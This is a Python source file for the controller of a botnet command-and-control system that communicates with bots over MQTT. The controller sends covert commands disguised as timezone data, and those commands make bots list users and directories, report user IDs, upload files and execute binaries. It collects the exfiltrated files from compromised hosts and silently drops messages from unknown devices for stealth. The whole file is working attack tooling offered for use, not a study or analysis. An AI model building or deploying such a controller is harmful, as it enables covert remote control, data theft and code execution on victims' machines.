# Controller component of Command & Control (C&C) system using MQTT
# This controller sends commands to bots and collects their responses

from paho.mqtt import client as mqtt
from datetime import datetime
from zoneinfo import ZoneInfo
from common import *
import threading
import random
import time

# Default timeout for waiting for bot responses
DEFAULT_TIMEOUT = 5

response_lock = threading.Lock()          # Protects bot_responses list
bot_responses: list[BotMessage] = []      # Accumulated responses from bots
connected_event = threading.Event()       # Signals when MQTT connection is ready

def on_connect(client, userdata, flags, reason_code, properties):
    """
    Callback triggered when controller connects to MQTT broker.
    Subscribes to the topic to receive bot responses.
    """
    # reason_code - connection result code. 0 - success, otherwise failure.
    if reason_code == 0:
        print("Connected to MQTT Broker.")
        # Subscribe to receive bot responses
        client.subscribe(MQTT_TOPIC)
        print(f"Subscribed to topic: {MQTT_TOPIC}.")
        # Signal that connection is ready
        connected_event.set()
    else:
        print(f"Failed to connect, connection return code {reason_code}.")
        client.disconnect()
        exit(1)


def on_message(client, userdata, msg):
    """
    Callback triggered when controller receives a message (bot response).
    Parses and stores bot responses.
    Filters out messages from unknown devices.
    """
    try:
        # Decode and parse incoming message
        payload = msg.payload.decode()
        request_msg = RequestMessage.from_json(payload)

        try:
            # Parse as bot response (not a command)
            data = BotMessage.from_request(request_msg)
            print(f"Deserialized payload: {data}")
            # Store response in thread-safe manner
            with response_lock:
                bot_responses.append(data)
        except Exception:
            # Message format doesn't match expected bot response
            print(f"Deserialized payload: {request_msg}")
            raise UnknownDeviceError()

    except UnicodeDecodeError:
        pass  # Ignore messages from unknown devices
    except UnknownDeviceError:
        pass  # Ignore messages from unknown devices - maintains stealth
    except Exception as ex:
        print(f"Error processing message {ex.__class__.__name__}: {ex}")


def timezone_date_time(timezone: str):
    """
    Get current datetime in specified timezone.
    Helper function for generating legitimate-looking timestamps.
    """
    now_utc = datetime.now(timezone.utc)
    try:
        return now_utc.astimezone(ZoneInfo(timezone))
    except Exception:
        # Ignore error, return UTC time as fallback
        return now_utc


def publish_action_request(client: mqtt.Client, user_action: int, path: str = None):
    """
    Publish a command to all bots via MQTT.
    Clears previous responses and sends new command disguised as timezones data.
    
    Args:
        client: MQTT client for publishing
        user_action: Controller command code (1-6)
        path: Optional path parameter for file/directory commands
    """
    response = RequestMessage()

    # Encode command as timezone (steganography)
    response.set_user_action(user_action)
    # Hide path parameter in encrypted/obfuscated message
    response.set_message(path)

    # Clear old responses before sending new command
    with response_lock:
        bot_responses.clear()

    # Broadcast command to all listening bots
    client.publish(MQTT_TOPIC, response.to_json())


def wait_for_responses(save_to_file, timeout=5):
    """
    Wait for bot responses and display them.
    Blocks for the specified timeout period to collect responses.
    
    Args:
        timeout: Seconds to wait for responses (default: 5)
    """
    print(f"Waiting {timeout} seconds for bot responses...")
    time.sleep(timeout)
    # Display all collected responses
    with response_lock:
        print(f"\nBot responses ({len(bot_responses)}):")
        for response in bot_responses:
            if not save_to_file:
                print(f"\t- {response.device_id}: {response.message}")
                continue

            # Generate unique filename using device_id and timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{response.device_id}_{timestamp}.dat"

            # Save file contents to local file
            try:
                with open(filename, 'wb') as f:
                    # Decode base64 content if needed, otherwise save as text
                    try:
                        import base64
                        file_data = base64.b64decode(response.message)
                        f.write(file_data)
                    except Exception:
                        # If not base64, save as text
                        f.write(response.message.encode('utf-8'))
                print(f"\t- {response.device_id} response saved to file {filename}")
            except Exception as ex:
                print(f"\t- {response.device_id} failed to save: {ex}")

def user_actions(client: mqtt.Client):
    """
    Interactive menu for sending commands to bots.
    Allows operator to select actions, specify parameters, and view responses.
    
    Args:
        client: Connected MQTT client for sending commands
    """
    retry = True
    while retry:
        try:
            # Display available commands
            print("Actions:")
            print(f'\t[{CMD_LIST_BOTS}] List alive bots.')
            print(f'\t[{CMD_LIST_USERS}] List logged in users.')
            print(f'\t[{CMD_LIST_DIR}] List content of specified directory.')
            print(f'\t[{CMD_GET_USER_ID}] Print ID of user running the bot.')
            print(f'\t[{CMD_DOWNLOAD_FILE}] Download specified file.')
            print(f'\t[{CMD_EXECUTE_BINARY}] Execute a binary.')
            print("\t[Q] Quit.")

            action = input("Select action: ").strip()

            # Commands that require a path parameter
            path = None
            if action in [str(CMD_LIST_DIR), str(CMD_DOWNLOAD_FILE), str(CMD_EXECUTE_BINARY)]:
                path = input("Enter path: ").strip()
                if not path:
                    print("Path cannot be empty.")
                    continue

            if action.upper() == "Q":
                print("Quitting...")
                retry = False

            # Allow operator to configure response timeout
            timeout = DEFAULT_TIMEOUT
            timeout_str = input(f"Set timeout (seconds) [Default {timeout}s]: ").strip()
            if timeout_str.isdigit() and int(timeout_str):
                timeout = int(timeout_str)

            # Execute valid command
            if action.isdigit() and int(action) in COMMAND_TO_TIMEZONE:
                publish_action_request(client, int(action), path)
                wait_for_responses(action == str(CMD_DOWNLOAD_FILE), timeout)
            else:
                print("Invalid action selected.")
                retry = True

        except KeyboardInterrupt:
            print("Quitting...")
            retry = False
        except Exception as ex:
            print(f"An error occurred during action selection: {ex}")
            retry = True


def main():
    """
    Main controller entry point.
    Connects to MQTT broker and starts interactive command interface.
    """
    # Create MQTT client with unique controller ID
    client_id = f"Controller{random.randint(1, 10000)}"
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id)

    # Register callback handlers
    client.on_connect = on_connect
    client.on_message = on_message

    # Connect to the C&C MQTT broker
    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        # Start MQTT loop in background thread
        client.loop_start()

        # Wait until connected (with 30 second timeout)
        if not connected_event.wait(timeout=30):
            print(f"Failed to connect to MQTT broker within timeout period.")
            return

        # Start interactive command interface
        user_actions(client)
    except Exception as ex:
        print(f"An error occurred: {ex}")
    finally:
        # Clean up MQTT connection
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()
